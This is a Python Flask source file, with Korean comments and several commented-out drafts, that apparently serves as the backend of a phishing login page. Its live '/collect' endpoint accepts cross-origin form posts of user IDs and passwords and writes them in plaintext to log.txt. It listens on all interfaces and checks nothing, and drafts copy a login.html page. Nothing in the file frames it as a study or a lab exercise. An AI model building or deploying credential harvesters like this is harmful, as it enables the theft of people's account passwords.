# from flask import Flask, request
# from flask_cors import CORS
# from datetime import datetime
# import os

# app = Flask(__name__)
# CORS(app)

# # log.txt 경로를 현재 이 파일 기준으로 고정
# BASE_DIR = os.path.dirname(os.path.abspath(__file__))
# LOG_PATH = os.path.join(BASE_DIR, 'log.txt')

# @app.route('/collect', methods=['POST'])
# def collect():
#     user = request.form.get('userid')
#     pw = request.form.get('password')
#     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

#     with open(LOG_PATH, 'a', encoding='utf-8') as f:
#         f.write(f"[{now}] ID: {user} | PW: {pw}\n")

#     return '', 204

# if __name__ == '__main__':
#     # app.run(host='0.0.0.0', port=5000)
#     app.run(host='127.0.0.1', port=5000)


# from flask import Flask, send_file

# app = Flask(__name__)

# @app.route('/api/save-login-html', methods=['GET'])
# def save_login_html():
#     html_path = os.path.join(app.root_path, '..', 'public', 'login.html')
#     log_path = os.path.join(app.root_path, 'log.txt')

#     try:
#         with open(html_path, 'r', encoding='utf-8') as f:
#             html_content = f.read()

#         with open(log_path, 'w', encoding='utf-8') as log_file:
#             log_file.write(html_content)

#         return 'login.html saved to log.txt', 200
#     except Exception as e:
#         return str(e), 500
    
# if __name__ == '__main__':
# #     # app.run(host='0.0.0.0', port=5000)
#     app.run(host='127.0.0.1', port=5000)

from flask import Flask, send_file, jsonify
from flask import request
from datetime import datetime
import shutil
import os
from flask_cors import CORS
# app = Flask(__name__)

# @app.route('/api/save-login-html', methods=['GET'])
# def save_login_html():
#     try:
#         # Flask 서버 기준에서 상위 폴더의 public/login.html 지정
#         src = os.path.abspath(os.path.join(app.root_path, '..', 'public', 'login.html'))
#         dst_dir = os.path.join(app.root_path, 'saved')
#         dst = os.path.join(dst_dir, 'login-copy.html')

#         print(f"[DEBUG] 📄 src 경로: {src}")
#         print(f"[DEBUG] 📁 dst 경로: {dst}")

#         if not os.path.exists(src):
#             print("❌ [ERROR] login.html 파일이 존재하지 않습니다.")
#             return 'login.html not found', 500

#         os.makedirs(dst_dir, exist_ok=True)
#         shutil.copyfile(src, dst)

#         return 'HTML 저장 완료!'
#     except Exception as e:
#         print('❌ 복사 실패:', e)
#         return 'failed to patch', 500
    
# @app.route('/collect', methods=['POST'])
# def collect_login_data():
#     try:
#         user = request.form.get('userid')
#         pw = request.form.get('password')
#         now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

#         log_path = os.path.join(app.root_path, 'log.txt')
#         print("[DEBUG] request.form:", request.form)
#         print("[DEBUG] raw data:", request.data.decode('utf-8'))


#         with open(log_path, 'a', encoding='utf-8') as f:
#             f.write(f"[{now}] ID: {user} | PW: {pw}\n")

#         return '', 204
#     except Exception as e:
#         print('❌ 로그인 수집 오류:', e)
#         return 'failed to collect', 500


from flask import Flask, request
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

@app.route('/collect', methods=['POST'])
def collect_login_data():
    user = request.form.get('userid')
    pw = request.form.get('password')
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    log_path = os.path.join(app.root_path, 'log.txt')
    with open(log_path, 'a', encoding='utf-8') as f:
        f.write(f"[{now}] ID: {user} | PW: {pw}\n")

    return 'ok', 200 

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    # app.run(host='127.0.0.1', port=5000)